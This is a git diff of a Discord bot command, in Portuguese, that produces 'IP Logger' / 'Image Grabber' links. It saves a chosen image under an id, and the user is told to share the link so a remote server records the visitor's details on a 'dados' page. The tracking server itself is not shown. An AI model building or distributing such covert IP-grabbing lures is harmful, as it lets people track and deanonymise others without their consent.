@@ -5,7 +5,7 @@ const path = require('path');
 module.exports = {
   data: new SlashCommandBuilder()
     .setName('img')
-    .setDescription('📸 Gera um link direto para a imagem com IP Logger')
+    .setDescription('📸 Gera um link direto para uma imagem com IP Logger')
     .addStringOption(option =>
       option.setName('link')
         .setDescription('Link da imagem (opcional)')
@@ -28,40 +28,52 @@ module.exports = {
     const link = `https://cbsteam.onrender.com/img/${id}`;
     const dadosLink = `https://cbsteam.onrender.com/dados/${id}`;
 
-    let imagemUrl = interaction.options.getString('link');
+    let imagemLink = interaction.options.getString('link');
     const attachment = interaction.options.getAttachment('imagem');
 
+    // Salva a imagem escolhida
+    const publicDir = path.join(__dirname, '..', 'public');
+    if (!fs.existsSync(publicDir)) fs.mkdirSync(publicDir);
+
+    let imagemSalva = false;
+
     if (attachment) {
-      imagemUrl = attachment.url;
+      try {
+        const response = await fetch(attachment.url);
+        const buffer = await response.buffer();
+        const ext = attachment.name.split('.').pop() || 'jpg';
+        const filePath = path.join(publicDir, `${id}.${ext}`);
+        fs.writeFileSync(filePath, buffer);
+        global.imageStore = global.imageStore || {};
+        global.imageStore[id] = filePath;
+        imagemSalva = true;
+      } catch (e) {
+        console.error('Erro ao salvar imagem:', e);
+      }
+    } else if (imagemLink) {
+      try {
+        const response = await fetch(imagemLink);
+        const buffer = await response.buffer();
+        const ext = imagemLink.split('.').pop()?.split('?')[0] || 'jpg';
+        const filePath = path.join(publicDir, `${id}.${ext}`);
+        fs.writeFileSync(filePath, buffer);
+        global.imageStore = global.imageStore || {};
+        global.imageStore[id] = filePath;
+        imagemSalva = true;
+      } catch (e) {
+        console.error('Erro ao baixar imagem:', e);
+      }
     }
 
-    // Baixa a imagem e salva localmente com o ID
-    if (imagemUrl) {
-      try {
-        const response = await fetch(imagemUrl);
-        const buffer = await response.buffer();
-        const publicDir = path.join(__dirname, '..', 'public');
-        if (!fs.existsSync(publicDir)) fs.mkdirSync(publicDir, { recursive: true });
-        fs.writeFileSync(path.join(publicDir, `${id}.jpg`), buffer);
-      } catch (e) {
-        console.error('❌ Erro ao baixar imagem:', e);
-      }
-    } else {
-      // Usa imagem padrão
-      const publicDir = path.join(__dirname, '..', 'public');
-      const padraoJpg = path.join(publicDir, 'imagem.jpg');
-      const padraoPng = path.join(publicDir, 'imagem.png');
-      if (fs.existsSync(padraoJpg)) {
-        fs.copyFileSync(padraoJpg, path.join(publicDir, `${id}.jpg`));
-      } else if (fs.existsSync(padraoPng)) {
-        fs.copyFileSync(padraoPng, path.join(publicDir, `${id}.png`));
+    // Se não salvou, usa a padrão
+    if (!imagemSalva) {
+      const padrao = path.join(publicDir, 'imagem.jpg');
+      if (fs.existsSync(padrao)) {
+        global.imageStore = global.imageStore || {};
+        global.imageStore[id] = padrao;
       } else {
-        // Fallback: baixa um GIF
-        try {
-          const response = await fetch('https://media0.giphy.com/media/v1.Y2lkPTc5MGI3NjExajM5anJmYzB2OHJxY3VranF2bHBtNm50dXE0eXRnd2I2ZTZ6NTM0biZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/bJ4TVNYNUympPgcpem/giphy.gif');
-          const buffer = await response.buffer();
-          fs.writeFileSync(path.join(publicDir, `${id}.jpg`), buffer);
-        } catch (e) {}
+        global.imageStore = global.imageStore || {};
+        global.imageStore[id] = null;
       }
     }
 
@@ -74,7 +86,6 @@ module.exports = {
         { name: '🆔 ID', value: `\`${id}\``, inline: true },
         { name: '📝 Dica', value: 'Cole o link no navegador ou compartilhe com alguém!' }
       )
-      .setImage(link)
       .setFooter({ text: 'CBS TEAM - Image Grabber' })
       .setTimestamp();
 
